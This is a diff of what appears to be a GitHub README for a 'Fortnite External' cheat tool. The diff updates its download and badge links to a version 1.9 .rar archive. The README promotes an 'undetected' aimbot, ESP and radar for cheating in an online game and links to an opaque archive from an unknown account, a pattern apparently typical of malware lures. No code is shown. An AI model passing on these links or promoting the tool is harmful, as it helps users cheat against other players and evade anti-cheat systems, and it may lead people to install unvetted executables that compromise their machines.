@@ -1,6 +1,6 @@
 <div align="center">
   
-  🎯 [Fortnite External](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/fortnite1.8/fortnite1.8.rar)
+  🎯 [Fortnite External](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/fortnite.1.9/fortnite.1.9.rar)
 
  > **The ultimate, feature-rich undetected utility for Fortnite. Full control over Aimbot, ESP, Radar, and Performance options.**
  
@@ -23,9 +23,9 @@
 ---
 
 
-### [⬇️ Download](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/fortnite1.8/fortnite1.8.rar)
+### [⬇️ Download](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/fortnite.1.9/fortnite.1.9.rar)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/fortnite1.7/fortnite1.7.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/fortnite.1.9/fortnite.1.9.rar)
 
 
 </div>
